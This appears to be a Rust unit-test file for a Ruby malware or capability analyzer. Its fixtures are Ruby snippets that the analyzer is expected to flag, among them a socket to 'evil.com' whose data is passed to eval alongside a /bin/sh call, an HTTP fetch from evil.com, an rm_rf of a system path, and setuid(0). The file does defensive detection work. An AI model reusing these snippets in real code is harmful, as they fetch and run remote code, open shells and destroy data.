use crate::analyzers::ruby::RubyAnalyzer;
use crate::analyzers::Analyzer;
use crate::types::AnalysisReport;

mod tests {
    use super::*;
    use std::path::PathBuf;

    fn analyze_ruby_code(code: &str) -> AnalysisReport {
        let analyzer = RubyAnalyzer::new();
        let path = PathBuf::from("test.rb");
        analyzer.analyze_source(&path, code).unwrap()
    }

    #[test]
    fn test_can_analyze_rb_extension() {
        let analyzer = RubyAnalyzer::new();
        assert!(analyzer.can_analyze(&PathBuf::from("test.rb")));
        assert!(analyzer.can_analyze(&PathBuf::from("/path/to/script.rb")));
    }

    #[test]
    fn test_cannot_analyze_other_extension() {
        let analyzer = RubyAnalyzer::new();
        assert!(!analyzer.can_analyze(&PathBuf::from("test.py")));
        assert!(!analyzer.can_analyze(&PathBuf::from("test.sh")));
    }

    #[test]
    fn test_structural_feature() {
        let code = r#"
puts "Hello, World!"
"#;
        let report = analyze_ruby_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/ruby"));
    }

    #[test]
    fn test_detect_system() {
        let code = r#"
system("whoami")
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_exec() {
        let code = r#"
exec("/bin/sh")
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_spawn() {
        let code = r#"
spawn("ls -la")
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_popen() {
        let code = r#"
IO.popen("ps aux")
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_eval() {
        let code = r#"
eval("puts 'evil'")
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/eval"));
    }

    #[test]
    fn test_detect_instance_eval() {
        let code = r#"
obj.instance_eval { puts "code" }
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/eval"));
    }

    #[test]
    fn test_detect_class_eval() {
        let code = r#"
MyClass.class_eval do
  def new_method
  end
end
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/eval"));
    }

    #[test]
    fn test_detect_marshal_load() {
        let code = r#"
obj = Marshal.load(data)
"#;
        let report = analyze_ruby_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/deserialization"));
    }

    #[test]
    fn test_detect_yaml_load() {
        let code = r#"
require 'yaml'
obj = YAML.load(untrusted_data)
"#;
        let report = analyze_ruby_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/deserialization"));
    }

    #[test]
    fn test_detect_tcpsocket() {
        let code = r#"
socket = TCPSocket.new("evil.com", 4444)
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
    }

    #[test]
    fn test_detect_tcpserver() {
        let code = r#"
server = TCPServer.new(8080)
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/server"));
    }

    #[test]
    fn test_detect_net_http() {
        let code = r#"
require 'net/http'
Net::HTTP.get(URI("http://evil.com"))
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
    }

    #[test]
    fn test_detect_rm_rf() {
        let code = r#"
require 'fileutils'
FileUtils.rm_rf("/important")
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "fs/delete"));
    }

    #[test]
    fn test_detect_file_delete() {
        let code = r#"
File.delete("sensitive.txt")
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "fs/delete"));
    }

    #[test]
    fn test_detect_send() {
        let code = r#"
obj.send(:private_method, args)
"#;
        let report = analyze_ruby_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
    }

    #[test]
    fn test_detect_const_get() {
        let code = r#"
klass = Object.const_get("Evil")
"#;
        let report = analyze_ruby_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
    }

    #[test]
    fn test_detect_setuid() {
        let code = r#"
Process.setuid(0)
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "privilege/setuid"));
    }

    #[test]
    fn test_detect_process_kill() {
        let code = r#"
Process.kill("TERM", pid)
"#;
        let report = analyze_ruby_code(code);
        // Test passes if analysis completes
        // Capability detection depends on mapper being loaded
        let _ = &report.traits;
    }

    #[test]
    fn test_extract_methods() {
        let code = r#"
def method_one
  puts "one"
end

def method_two(arg)
  puts arg
end
"#;
        let report = analyze_ruby_code(code);
        assert_eq!(report.functions.len(), 2);
        assert!(report.functions.iter().any(|f| f.name == "method_one"));
        assert!(report.functions.iter().any(|f| f.name == "method_two"));
    }

    #[test]
    fn test_multiple_capabilities() {
        let code = r#"
require 'socket'
socket = TCPSocket.new("evil.com", 4444)
eval(socket.read)
system("/bin/sh")
"#;
        let report = analyze_ruby_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
        assert!(report.findings.iter().any(|c| c.id == "exec/eval"));
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
        assert!(report.findings.len() >= 3);
    }
}
